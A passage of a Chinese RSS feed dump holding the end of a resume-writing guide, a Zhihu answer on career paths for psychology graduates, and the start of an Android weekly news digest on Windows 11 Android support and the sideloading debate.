的话，可能就不会考虑第二份工作了；或者我们不想搬去加拿大，只想远程工作的话，就不用考虑第一份工作了。所以在修改简历的时候，我们就要根据上面的招聘需求，做出针对性的调整。</p>\n<h2><strong>审视经历</strong></h2>\n<p>断舍离的第二步就是审视自己拥有的每一件物品，当我们使用同一思路来修改我们的简历时，我们也需要认真审视每一段工作/项目经历。如上面所言，优秀的简历应当简明扼要，重点突出，密切相关。反之，糟糕的简历通常冗余散乱，不知所云。所以在重新审视这一步，我们要仔细修改每一段工作/项目经历。具体有以下几步：说人话，具体化和数字化。</p>\n<p>先让我们来看一个描述算法项目的例子：</p>\n<blockquote><p>负责将图像识别项目的指标提升，超过 SOTA。</p></blockquote>\n<p>这是一个很典型的项目经历描述，也有几个很典型的问题：</p>\n<ol>\n<li>不说人话</li>\n<li>不具体化</li>\n<li>无数字化</li>\n</ol>\n<h3><strong>说人话</strong></h3>\n<p>我们经常假设受众和我们有类似的认知水平，所以在沟通时，我们会忽略解释一些概念，让对方不太好理解我们的沟通。这就是<a href=\"https://acacess.substack.com/p/daily-productive-sharing-150\">知识的诅咒</a>。</p>\n<p>在上面这个例子中，什么是 SOTA？我们的受众都理解什么是 SOTA 吗？SOTA 是 state of the art 的缩写，指的是业界最高水平，一般在实验中都会拿业界最高水平来做参照，力争在此基础上能够提升。</p>\n<p>如果我们的受众都理解 SOTA 是什么，这倒不是大问题。可是，不是所有的简历读者都能理解这是什么，这就造成了极大的认知困难。比如简历的潜在读者有猎头，有招聘专员，他们并不一定对这些行业了解地那么深入（当然也有些厉害的猎头/招聘专员会深入了解），而我们的简历首先要经过他们这两关。如果他们不能理解你的项目经历，那么你的简历还有多少几率往后走呢？</p>\n<p>所以当我们写简历的时候，一定要说人话。上面这个描述可以改为更易懂的：</p>\n<blockquote><p>负责将图像识别项目的指标提升，超过当前业界最高水平（SOTA）。</p></blockquote>\n<h3><strong>具体化</strong></h3>\n<p>尽管我们将最初的表述改为了：</p>\n<blockquote><p>负责将图像识别项目的指标提升，超过当前业界最高水平。</p></blockquote>\n<p>这样的表述还是相对笼统，我们可以增加一些细节让项目表述变得具体化，比如这一图像识别问题是针对什么类型的图像，比如我们利用了什么模型等等。这些具体的细节可以帮助读者更好地了解你的工作，在后续的面试里也能更有针对性地提问。比如我们可以改为：</p>\n<blockquote><p>利用 Yolo4 模型将夜间图像识别项目的指标提升，超过当前业界最高水平（SOTA）。</p></blockquote>\n<h3><strong>数字化</strong></h3>\n<p>通过前面两部分的修改，我们已经把一个笼统不易懂的项目描述变得具体易懂，还有没有改进空间呢？当然有，我们还可以把它改得更加易懂。这就需要我们把这一描述变得量化。</p>\n<blockquote><p>利用 Yolo4 模型将夜间图像识别项目的指标提升，超过当前业界最高水平（SOTA）。</p></blockquote>\n<blockquote><p>利用 Yolo4 模型将夜间图像识别项目的准确率提升到97%，比当前业界最高水平（SOTA）高出1%。</p></blockquote>\n<p>通过这97%和1%这两个数字，我们将这一项目经历变得更加具体，也更易懂，不管是不是业内人士，都可以一下子了解你的贡献了。</p>\n<p>通过说人话-具体化-数字化这看似简单的三步，我们成功将原本含糊不清的项目描述变得具体易懂。试着比较下面两个版本，如果你是面试官，你会倾向于哪位候选人呢？</p>\n<blockquote><p>负责将图像识别项目的指标提升，超过 SOTA。</p></blockquote>\n<blockquote><p>利用 Yolo4 模型将夜间图像识别项目的准确率提升到97%，比当前业界最高水平（SOTA）高出1%。</p></blockquote>\n<p>简单而言，如何介绍自己的项目经历就三步：</p>\n<ol>\n<li>说人话</li>\n<li>具体化</li>\n<li>数字化</li>\n</ol>\n<p>其实这几点加起来就是一个公式：</p>\n<p><strong>我在项目中做了什么 + 我的贡献是什么 （数字化）</strong></p>\n<p>也就是说，每一段项目都可以用这么一句话讲清楚。</p>\n<h2><strong>调整简历</strong></h2>\n<p>上面的审视环节主要着眼于简历中的笼统晦涩的项目/工作描述；接下来我们要解决另一个写简历的常见问题：冗长繁复。我们往往看到一些长而空洞的简历，比如明明是社招的简历，连高中当了班干部都往上放，这种不知所云的简历怕是很难过了面试官的法眼。那么如何写出一份言之有物又简洁的简历呢？具体可以从以下两方面入手：</p>\n<ol>\n<li>相关性</li>\n<li>一页纸</li>\n</ol>\n<h3><strong>相关性</strong></h3>\n<p>要想把一份简历改得简洁，最主要的就是只放和求职职位相关的内容上去。比如你是社招的话，就只放以往工作经历和实习经历，至于你在学校里的社团经历，就是完全无关的部分了。再比如你的工作经历十分丰富，中间又参杂了不同职能的项目经历，建议只放和未来求职相关的经历。也就是说，假如你要找一个编辑的职位，但是你过往的经历里还有做出纳的经历，这时候并不建议把这段经历放上去，因为做出纳和做编辑是不太相关的两个职业。当然，如果找的是财经类编辑，这段做出纳的经历可能会有很大帮助。</p>\n<h3><strong>一页纸</strong></h3>\n<p>有一个不成文的规定就是你的简历不应该超过一页纸。超过的话，只能说明你不知道如何归纳重点。从面试官的角度而言，简历只是一份索引，面试官希望通过这份索引对面试者做出一个大致的判断，继而在面试时有针对性地提问。如果一份简历冗长，那么很有可能导致两个结果：一是面试官不太容易找到面试者的亮点；二是很有可能前后矛盾而被找出漏洞。</p>\n<p>之前看过一些比较冗长的简历，其实是面试者自己堆砌起来的简历，一算各段建立的起始日期就发现不能自圆其说。所以后来看到冗长的简历就会多一个问号，到底是面试者太厉害了呢？还是在堆砌简历？</p>\n<h3><strong>再来一个公式</strong></h3>\n<p>上面的公式适用于一个具体项目的描述，我们再给出一个公式，就是一份简洁而相关的简历到底应该包含哪些内容？</p>\n<ol>\n<li>姓名 （必选）</li>\n<li>联系方式：手机 + 邮箱 （必选）</li>\n<li>个人简介（可选）</li>\n<li>相关工作经历 （必选）</li>\n<li>教育经历（必选）</li>\n<li>论文发表经历 （可选）</li>\n<li>相关资格认证 （可选）</li>\n</ol>\n<p>必选的内容就不多做介绍了，我们着重讲一下可选内容吧。</p>\n<p>个人简介并非是简历里的必选项，因为你的项目经历才是最最核心的具体体现，而个人简介只是一个概要而已。如果你觉得有必要写个人简介，也请无比简洁明了，三四句话把自己介绍清楚即可，没必要洋洋洒洒几百字。</p>\n<p>如果你有 peer-reviewed 的期刊/会议论文或者博士论文，当然放上去无妨，其他就不必放了。如果你著作等身，可以放一个 selected publication，把自己最好的论文放上去。</p>\n<p>相关资格认证也是可有可无的，比如你放个大学四六级，估计也没人关心，或者你明明找程序员的职位，放个计算机二级证书也毫无帮助。不过不少行业还是需要专业认证的，比如律师执照或者建筑师证等等，这些当然会大大帮助你的求职。</p>\n<h2><strong>结果呢？</strong></h2>\n<p>通过以上几步断舍离，我们就可以把一份冗长糟糕的简历修改成简洁明了，重点突出，上下连贯，密切相关，并且简单易懂的简历。这样的简历也会大大提高你获得面试邀请的几率，进而找到满意的职位。当然光说不练假把式，以上简历断舍离的效果到底如何呢？经过这几步修改之后，其中一位朋友成功拿到了微软 / Unity / Amazon 三家大厂的技术岗面试机会，最后成功入职了微软；另外一位朋友也拿到了 Apple 的非技术岗面试机会，目前正在面试流程中。</p>\n<figure class=\"image ss-img-wrapper image_resized\"><img src=\"https://cdn.sspai.com/2021/05/27/54d7eb43c31a68a5cef1f8bd9890690a.JPG\"><figcaption>朋友入职微软后发来的消息</figcaption></figure><p>让我们再来回顾一下断舍离简历的步骤：</p>\n<ul>\n<li>明确目标</li>\n<li>审视经历</li>\n<li>调整简历</li>\n</ul>\n<p>在审视经历时，我们需要做到：</p>\n<ol>\n<li>说人话</li>\n<li>具体化</li>\n<li>数字化</li>\n</ol>\n<p>而根据招聘要求调整简历时，我们需要做到：</p>\n<ol>\n<li>相关性</li>\n<li>一页纸</li>\n</ol>\n<p>如果你对这一简历断舍离还有什么疑问的话，<a href=\"https://letters.acacess.com/cv/\" target=\"_blank\">也欢迎和我们来聊聊</a>，看看能不能最终帮到你。最后祝大家都找到自己心仪的工作。</p>\n","link":"https://sspai.com/post/66893"},{"title":"2021 年高考生想选心理学专业，好找工作吗？工资多少？就业方向和就业前景怎么样？","date":"2021-07-01 05:30:09","description":"\n<p>学心理学的人，毕业之后能做什么工作？</p>\n<p>都去做心理咨询师么？当然不是。</p>\n<p>继续做科研？可以呀，但也当然不是唯一的选择。</p>\n<p>《心理学职业发展手册》，由北京师范大学心理学部社会实践队出品，自2015年起，深度访谈在社会各领域心理学人，讲述生涯故事，希望全方位介绍心理学专业毕业生在毕业后可选择的职业方向与行业情况。</p>\n<p>学堂君在这个回答下面重新发布一下手册的完整目录，供心理学生或即将就读于心理学专业的同学翻阅了解。</p>\n<h2><b>高校教师</b></h2>\n<p><img src=\"https://pic4.zhimg.com/v2-e7b375120927ff15a8a017a4d21206b5_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1080\" data-rawheight=\"1527\" data-watermark=\"original\" data-original-src=\"v2-e7b375120927ff15a8a017a4d21206b5\" data-watermark-src=\"v2-10f11376ddf7be462a776ab28e265b43\" data-private-watermark-src=\"v2-469493b9cf8cc20001135e010463122f\"></p>\n<p>在我国高校中，高校教师一般分为教学科研、工程实验员和行政管理等几类岗位。本节聚焦于承担教学科研任务的高校教师。</p>\n<p>有别于在研究院所中开展研究的科研工作者，高校教师一般需要承担科研和教学两方面的任务，发展过程中，还可能兼任系主任、副院长、院长等行政工作。除本专业外，心理学背景的科研工作者还广泛活跃于教育学、教育技术、行为经济学、人力资源管理、公共管理等院系部所。</p>\n<p>详见：<a href=\"http://link.zhihu.com/?target=https%3A//mp.weixin.qq.com/s/fLpSoSt49LVt1G1v6JXUhg\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">当学心理的人留在高校成为教师 | 心理学职业发展手册</a> </p>\n<h2>用户体验</h2>\n<p><img src=\"https://pic3.zhimg.com/v2-2ca7b433867b7e6821e5248e0765a4cc_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1440\" data-rawheight=\"2036\" data-watermark=\"original\" data-original-src=\"v2-2ca7b433867b7e6821e5248e0765a4cc\" data-watermark-src=\"v2-39838cccaf4380249da2df543ad9573b\" data-private-watermark-src=\"v2-0cb4fde68f03c5f40ba65bed13946c5f\"></p>\n<p>用户体验是用户在使用产品的过程中感受的总和，通俗来讲就是“这个东西好不好用、方不方便”。用户体验行业旨在为用户解决基本功能问题，提升产品的使用感受，满足用户的情感诉求。用户体验针对的产品不局限在实物，也包括虚拟产品，比如手机应用、服务等等。目前，各种各样的行业都已经逐渐意识到了提升用户体验对于产品开发与推广的重要性，并在公司内设立相关的部门。</p>\n<p>详见：<a href=\"http://link.zhihu.com/?target=https%3A//mp.weixin.qq.com/s/8wVu3X_5JU-JWUquaEEGGg\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">学心理的人“让产品更好用” | 心理学职业发展手册</a> </p>\n<h2>市场研究</h2>\n<p><img src=\"https://pic3.zhimg.com/v2-726bc306302a8d10543d2a8c4532f0d4_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1440\" data-rawheight=\"2036\" data-watermark=\"original\" data-original-src=\"v2-726bc306302a8d10543d2a8c4532f0d4\" data-watermark-src=\"v2-33eb3aad44f733d8e3031beabe84455d\" data-private-watermark-src=\"v2-c5b734db735f868793eaf51f2043cdf3\"></p>\n<p>市场研究公司是专业从事市场研究、市场调查、营销研究、满意度调查的专业公司。根据全球市场研究者协会的定义，市场研究公司接受其他组织的委托，为委托方需要进行的决策收集信息并进行专业性的研究活动。包括设计收集信息的方法、收集并管理数据、分析数据、得出相关结论等等。和战略咨询公司相比，市场研究公司偏重于科学、有效地收集中立的市场信息并作出分析，一般不对组织决策作出规划和指引，但可提出建议。</p>\n<p>详见：<a href=\"http://link.zhihu.com/?target=https%3A//mp.weixin.qq.com/s/zR2P63BHrVOwQpPi_sPS_Q\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">心理人如何研究市场 | 心理学职业发展手册</a> </p>\n<h2>考试研究</h2>\n<p><img src=\"https://pic3.zhimg.com/v2-0b121ba889b679b8008e4f8f5c08b607_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1440\" data-rawheight=\"2036\" data-watermark=\"original\" data-original-src=\"v2-0b121ba889b679b8008e4f8f5c08b607\" data-watermark-src=\"v2-498828c94bca70138cebf2fa874455c3\" data-private-watermark-src=\"v2-67e718461e57e94c0203d0dcb62555be\"></p>\n<p>对人才的选拔是心理测量学中一个重要的研究方向。在中国，有许多人才选拔是由国家的各大考试院或考试中心来统一组织的，包括高考、公务员考试、医学资格考试等等。在这些考试院或考试中心中，有大量的心理学人负责为大型统一考试命题，收集考试数据进行收集、分析，甚至为教育考试改革提供意见与建议。</p>\n<p>详见：<a href=\"http://link.zhihu.com/?target=https%3A//mp.weixin.qq.com/s/C7-RFf8GYzA9QqBttNs2Ag\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">心理学人能在考试中做什么 | 心理学职业发展手册</a> </p>\n<h2>心理咨询</h2>\n<p><img src=\"https://pic2.zhimg.com/v2-e6acf9775827fc921f1d2a8378a42873_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"762\" data-rawheight=\"1082\" data-watermark=\"original\" data-original-src=\"v2-e6acf9775827fc921f1d2a8378a42873\" data-watermark-src=\"v2-22852cfa3329d02491c5d9e79bc94920\" data-private-watermark-src=\"v2-d71f4e3fb0cfbd3cd2729ade8d11daa8\"></p>\n<p>心理咨询是指用一些专业的流派方法，通过语言交流或者一些互动活动来帮助来访者解决一些心理上的阻碍、促进来访者的交流沟通的一种专业帮助形式。许多大型公立的组织机构设立了心理咨询师的职位，如学校、残联、养老院等等，为组织内部的成员提供心理健康服务，解决相关心理问题（见高校心理咨询中心一章）。</p>\n<p>在在本章中，我们主要介绍在私立营利的心理咨询机构中工作的职业心理咨询师的工作。</p>\n<p>详见：<a href=\"http://link.zhihu.com/?target=https%3A//mp.weixin.qq.com/s/O58Yc9kdo_OSBN0GHsvFGQ\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">成就感与压力并存的助人者——心理咨询师 | 心理学职业发展手册</a> </p>\n<h2>高校心理咨询</h2>\n<p><img src=\"https://pic1.zhimg.com/v2-ce51cc709bb8a90e4b73069a153c10a8_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1440\" data-rawheight=\"2036\" data-watermark=\"original\" data-original-src=\"v2-ce51cc709bb8a90e4b73069a153c10a8\" data-watermark-src=\"v2-8e7bfba999b2e9a6c4a5b41ebef94fc0\" data-private-watermark-src=\"v2-669cb11a8aee20e6a642f8ff19147d34\"></p>\n<p>近年来，由于国家对大学生心理健康工作的重视和支持，大部分高校都设立了心理咨询中心，负责开展面对在校学生的心理咨询和心理健康教育。同时，根据不同高校对心理健康重视程度的不同，以及心理咨询中心行政从属关系的不同，咨询师往往还需要同时进行其他相关工作，如开展培训、讲座、心理健康活动等等。</p>\n<p>详见：<a href=\"http://link.zhihu.com/?target=https%3A//mp.weixin.qq.com/s/Ri_cfG5T2LZqmoxL5KVHMw\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">高校心理咨询师篇 | 心理学职业发展手册</a> </p>\n<h2>生涯规划师</h2>\n<p><img src=\"https://pic4.zhimg.com/v2-0101c6d2e28f4bd9f1b35f6964a2c8ba_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"754\" data-rawheight=\"1068\" data-watermark=\"original\" data-original-src=\"v2-0101c6d2e28f4bd9f1b35f6964a2c8ba\" data-watermark-src=\"v2-e7ca85442ed7927d196cd3f770878fb0\" data-private-watermark-src=\"v2-4f6ce481f4bbf85f4c5db5273580eae0\"></p>\n<p>生涯规划师是针对个人的具体情况，通过测试、咨询、诊断、规划等方式，运用科学的测评工具，引导来访者客观地认识自己，调适自己的职业状态，制定合理的职业发展规划的专业人士。大多数生涯规划师供职于生涯规划公司，根据工作内容，又细分为咨询师和培训师。前者更多接受来访者一对一的咨询，而后者通过网络课程、现场讲座等方式向参与者提供生涯规划技巧。</p>\n<p>在生涯规划公司中，除了直接为客户提供职业咨询服务的咨询师和培训师，还有大量的支持性部门。如负责开发相关测验的测评部门、负责营销推广的市场部门等等。这些部门无疑也需要大量的心理学专业人才，但因为他们的工作内容和节奏与市场研究、考试研究行业中的研究型岗位都有相似之处，所以在本章中不再做详细介绍，而只聚焦于规划师的工作内容。</p>\n<p>详见：<a href=\"http://link.zhihu.com/?target=https%3A//mp.weixin.qq.com/s/hPvxGGX-OEb0BtFbErb9Wg\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">生涯规划师篇 | 心理学职业发展手册</a> </p>\n<h2>心理学传播</h2>\n<p><img src=\"https://pic3.zhimg.com/v2-8cb6767bc7d7bb9427dc4e1087b99d1c_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1440\" data-rawheight=\"2036\" data-watermark=\"original\" data-original-src=\"v2-8cb6767bc7d7bb9427dc4e1087b99d1c\" data-watermark-src=\"v2-20dcc4962260f142ac44e12ad24d2230\" data-private-watermark-src=\"v2-5d5c521bbd3c522294ea92d54b0cbb79\"></p>\n<p>随着社会大众对心理健康的日益重视，普及与传播心理学知识、帮助人们了解自身和他人成为了心理学人的重要使命之一。除传统出版行业外，包括微信公众号、短视频、知乎等在内的多种形式的心理学传播机构也应运而生，从而创造出了大量需要心理学专业人才的岗位。</p>\n<p>由于心理学传播的形式多种多样，工作职责也各不相同，在本章中，我们将主要介绍传统纸质出版编辑和心理学科普公众号编辑两种差距较大、且较具代表性的工作岗位。同为心理学传播行业，传统出版行业的编辑工作更加稳定、专业和严谨；而公众号编辑的工作则更需要创造力、感知和追逐热点的能力。总之，这些形式和内容各异的岗位，为有志于心理学传播的心理学专业学生提供了多元的选择。</p>\n<p>详见：<a href=\"http://link.zhihu.com/?target=https%3A//mp.weixin.qq.com/s/XqyOfhICOeWW722N46s9Dg\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">在出版界和新媒体发声的心理人 | 心理学职业发展手册</a> </p>\n<h2>中小学心理老师</h2>\n<p><img src=\"https://pic2.zhimg.com/v2-4409e6d946296a692a02ff253fbc7627_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1440\" data-rawheight=\"2036\" data-watermark=\"original\" data-original-src=\"v2-4409e6d946296a692a02ff253fbc7627\" data-watermark-src=\"v2-a29745b681767a426376ad79b00abb10\" data-private-watermark-src=\"v2-0ff7e7c9545dc4674de24d669b86e08c\"></p>\n<p>中小学校心理老师是对所在学校进行心理健康教育建设工作，通过课程、咨询等手段改善师生心理健康状况，以达到促进学生健康成长、改善老师工作环境等目的的职业。目前，越来越多的中小学校开始重视心理健康教育。大部分中小学校也都配备了专职的心理教师。</p>\n<p>相较于在高校心理咨询中心工作的心理老师，中小学校的心理老师与全体学生的联系更加紧密，面对的学生群体的年龄、主要心理困惑也不太相同。</p>\n<p>详见：<a href=\"http://link.zhihu.com/?target=https%3A//mp.weixin.qq.com/s/UKErgp5dP0yhKYKus3g1MA\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">心理人在中小学当老师 | 心理学职业发展手册</a> </p>\n<h2>人力资源</h2>\n<p><img src=\"https://pic2.zhimg.com/v2-261b8008e0e00970f41f7542d71ac5ab_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1440\" data-rawheight=\"2036\" data-watermark=\"original\" data-original-src=\"v2-261b8008e0e00970f41f7542d71ac5ab\" data-watermark-src=\"v2-c561298a3865f8549275ee9adf15778f\" data-private-watermark-src=\"v2-308e30df3940e195cf823285f155bd34\"></p>\n<p>人力资源部门（Human Resource，后文简称为HR部门）作为企业重要的支持性部门，负责对员工的薪酬、绩效、技能培养等进行管理。无论是哪一行业、哪一类型的企业，都会设立HR部门；同时，人力资源部门的工作内容和部门地位也受到企业本身较大程度的影响。</p>\n<p>详见：<a href=\"http://link.zhihu.com/?target=https%3A//mp.weixin.qq.com/s/C1LRRCV9b0ZdmIWmNLts6A\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">心理人如何跟“人力”打交道 | 心理学职业发展手册</a></p>\n<h2>管理咨询</h2>\n<p><img src=\"https://pic3.zhimg.com/v2-cd4d425510c53b34281d33364e188b44_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1440\" data-rawheight=\"2036\" data-watermark=\"original\" data-original-src=\"v2-cd4d425510c53b34281d33364e188b44\" data-watermark-src=\"v2-b01012cbd64ae9892297589e0a03f82a\" data-private-watermark-src=\"v2-254d88e02409833f8c00b1ff512d2374\"></p>\n<p>管理咨询是由专家找出企业经营战略和经营管理上存在的问题，分析原因，提出改进方案的过程。而管理咨询顾问就如同企业的“医生”，负责为提出委托的企业提供诊断和治疗方案。</p>\n<p>目前，管理咨询分为战略咨询和人力资源咨询两大种。战略咨询偏向企业的经营与发展，与经济学、市场营销等关系较大；而人力资源咨询主要解决企业在人力资源管理过程中存在的问题，为企业提供员工招聘、绩效考核方案设计、薪酬体系规划、公司文化建立、员工培训等服务，是心理学人较多进入的行业。</p>\n<p>详见：<a href=\"http://link.zhihu.com/?target=https%3A//mp.weixin.qq.com/s/oQM-ZBV80iW8_cr2F-gLyQ\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">心理人在企业当“医生” | 心理学职业发展手册</a> </p>\n<h2><b>心理学人还会去哪儿</b></h2>\n<p><img src=\"https://pic4.zhimg.com/v2-a75da85ec00f2fc4c8c73e33ea5c2dc1_720w.png?rss\" data-caption=\"\" data-size=\"normal\" data-rawwidth=\"1440\" data-rawheight=\"2043\" data-watermark=\"original\" data-original-src=\"v2-a75da85ec00f2fc4c8c73e33ea5c2dc1\" data-watermark-src=\"v2-5b0e53d15b508c138efe18efa644d88a\" data-private-watermark-src=\"v2-1045cc8fb4116f40ca4bf8911a765392\"></p>\n<p>心理学作为与人和社会有关的学科，与各种职业、各种工作都有一定的联系。心理学人的职业生涯选择也因此而变得格外多元。各行各业中都遍布心理学人的身影。那么，除了前十一章中所谈到的行业外，其他的心理学人都在哪里工作呢？</p>\n<p>详见：<a href=\"http://link.zhihu.com/?target=https%3A//mp.weixin.qq.com/s/V9m9Nk1CUEkq9xoXp5J4uA\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">心理学人还会去哪儿 | 心理学职业发展手册</a> </p>\n<p><br></p>\n<p><br></p>\n<p>作者：心理学生涯人物访谈实践队</p>\n<p>相关原文：<a href=\"http://link.zhihu.com/?target=https%3A//mp.weixin.qq.com/s/czMDSl8rco4lGsxVchVTSw\" class=\" wrap external\" target=\"_blank\" rel=\"nofollow noreferrer\">这本手册告诉你心理人在做什么工作 | 2018年终福利</a></p>\n<p>欢迎关注心理学科普平台<a href=\"https://www.zhihu.com/people/f3260f05df264ee916da258e1384e247\" class=\"internal\">@京师心理大学堂</a>，北京师范大学心理学部出品，奉献百年积淀，带你脑洞大开。任何形式的转载请知乎私信联系。</p>\n<br><br>\n来源：知乎 www.zhihu.com<br>\n    \n作者：<a href=\"http://www.zhihu.com/people/jing-shi-xin-li-da-xue-tang?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=author\">京师心理大学堂</a><br><br>\n【知乎日报】千万用户的选择，做朋友圈里的新鲜事分享大牛。\n        <a href=\"http://daily.zhihu.com/?utm_source=rssyanwenzi&amp;utm_campaign=tuijian&amp;utm_medium=rssnormal\" target=\"_blank\">点击下载</a><br><br>\n此问题还有 <a href=\"http://www.zhihu.com/question/459989284/answer/1971264035?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">25 个回答，查看全部。</a><br>\n                延伸阅读：<br><a href=\"http://www.zhihu.com/question/328706095?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">对于2019 入学的准大学生来说，哪些专业就业前景「亮红灯」，需要加以警惕？</a><br><a href=\"http://www.zhihu.com/question/459989326?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title\" target=\"_blank\">2021 年高考生想选能源动力专业，好找工作吗？工资多少？就业方向和就业前景怎么样？</a><br>\n","link":"http://www.zhihu.com/question/459989284/answer/1971264035?utm_campaign=rss&amp;utm_medium=rss&amp;utm_source=rss&amp;utm_content=title"},{"title":"Refresh 周报：本周值得关注的泛 Android 资讯","date":"2021-07-01 03:39:53","description":"\n<p>📰 <strong>关于 Refresh 周报</strong></p>\n<p>每周更新泛 Android 领域内容，带你回顾过去一周 Android 数码/行业领域值得关注的大小事件。</p>\n<p><strong>📣  本周</strong></p>\n<p>本周大新闻毫无疑问当属 Windows 11 的正式发布，虽然在很多用户看来仍然换汤不换药，但即将到来的 Android 虚拟机支持还是非常值得期待；此外苹果高管针对 iOS 不允许侧载应用的多次言论也将这一问题再次推向风口浪尖。本周还有 MD 设计奖评选开幕、One UI Watch 以及 160W 有线快充手机等新闻值得关注。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/01/article/0fe74f976bb9da4c3f68049726dda8cb\"></figure><h2>🍿️ 本周主题：Windows 11 &amp; Android</h2>\n<blockquote><p>发展历程迥异的两大操作系统，为了更好的用户体验，最终还是将手握在了一起</p></blockquote>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/01/article/9e296243f8857db34c5cd9898a620ad2\"></figure><p>截至本期周报正式发送时，Windows 11 的首个开发者预览版本已经开始推送了，我们也已经第一时间更新了首个测试版本；对于 Android 用户来讲，Windows 11 即将正式加入的「支持运行 Android 应用」这一特性（目前版本中尚未加入）。</p>\n<p>这里再简单介绍一下 Windows 11 中支持 Android app 运行的原理：Windows 中的 Android 应用实际上需要使用 WSA 虚拟机环境来运行，同时借助 Intel Bridge 架构转换技术，让其以更高效率的方式运行，最终获得与 Windows 原生应用近乎无异的使用体验。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/01/article/0e590c7f08c4917d3fec0a6a0e3e7dd0\"></figure><p>不过说到 Windows 与 Android 的邂逅，Windows 11 其实早就不是第一次出现在公众视线的「联动」了：由于来自另一个庞然巨物的生态压力，Windows 与 Android 在过去经常会「走到一起」：不仅有 Windows 10「你的手机」服务原生支持与 Android 联动（但也只停留在较浅的软件层面），也有不少类似 <a href=\"https://www.airdroid.com/\" target=\"_blank\">AirDroid</a> 这样的第三方 Windows - Android 协同工具。</p>\n<p>除此之外，同样是为了应对竞争对手的生态压力，三星、华为这些自家品牌本身就制造 Android 智能手机的品牌更是已经在此领域深耕数年，实际使用体验中已经做到了很高水准，包括同步剪贴板、直接在桌面端打开手机中的文档、在 PC 中开启多个手机应用等功能；也有本身并不生产智能手机的 PC 整机厂商（比如戴尔）也推出了类似的产品服务。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/01/article/16883fb099890ece91350f48dc8fed65\"></figure><p>回到本次 Windows 11 的 Android 虚拟机上，由于现有大部分 Android 应用都是针对 ARM 架构开发，因此当前已经推出的部分 ARM 架构 Windows 10 二合一设备，未来在升级 Windows 11、并支持运行 Android 应用之后，或许还能凭借原生架构优势，避免应用编译导致的性能损失，从而获得更好的运行性能；这对于残缺不堪的 Windows on ARM 应用生态同样是一件好事。</p>\n<p>此外，虽然开发者已经在 Twitter 上确认 Windows 11 将会支持侧载 Android Apk 安装包，但由于 Windows 11 官方下载 Android 应用的渠道是由亚马逊提供，即使微软 CEO 纳德拉在多次接受 <a href=\"https://www.theverge.com/22549385/microsoft-satya-nadella-interview-windows-11-decoder\" target=\"_blank\">采访</a> 时表示「会与更多 Android 应用商店合作」，未来需要 Google 服务框架（GMS）才能正常运行的 Android App 能否在 Windows 11 上正常运行，仍然是一个未知数。</p>\n<p>而且随着 Play Store 已经开始强制应用由 apk 安装包向 aab（Android App Bundle）格式安装包迁移，未来 Windows 11 中想要建立起堪用的 Android 生态，微软还有很多需要解决的问题。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/01/article/d7e3607441e2b64224ec26c9d9c94fdd\"></figure><p>但无论如何，Windows 11 支持 Android 应用运行，无疑是让 Android 应用借此机会，面向更多数以十亿计的桌面端、大屏幕设备；可以预见的是未来会有更多 Android 版本应用，愿意针对桌面端/大屏使用而优化，从这个角度来讲，Windows 11 的这一改变甚至对于 Android 平板生态来讲，这都是一个意料之外的好消息。</p>\n<h2>📡 侧载应用之争</h2>\n<blockquote><p>争论没有尽头，我们按需选择即可</p></blockquote>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/01/article/d42a268eb2e161eabb6280999239ab45\"><figcaption>MacRumors</figcaption></figure><p>关于「Android/iOS 侧载应用会让手机变得不安全」这个论题其实出现很多年了，而且辩论双方似乎都有充分的证据，而作为天平的其中一端，苹果数位高管在本周针对这一议题频繁「开炮」，抨击 Android 系统的安全性问题，同时鼓吹「禁止侧载应用的 iOS 才是安全的系统」这一概念。</p>\n<p>首先是本月 18 日，苹果 CEO Tim Cook 在接受 <a href=\"https://www.youtube.com/watch?v=hWUWZ2K8p3Y\" target=\"_blank\"><u>Brut America</u></a> 视频连线时表示，明确表示反对且不会考虑在 iOS 上侧载应用的做法，认为这会导致 App Store 的各种应用审核以及应用追踪透明度等安全措施形同虚设。Tim Cook 还引用了 Android 系统恶意软件是 iOS 的 15 倍之多的调查数据作为论据。</p>\n<figure class=\"image ss-img-wrapper\"><img src=\"https://cdn.sspai.com/2021/07/01/30b3b1c3437de11ebf42c462d8a0b817.png\"></figure><p>随后在 23 日，苹果用户隐私主管 Erik 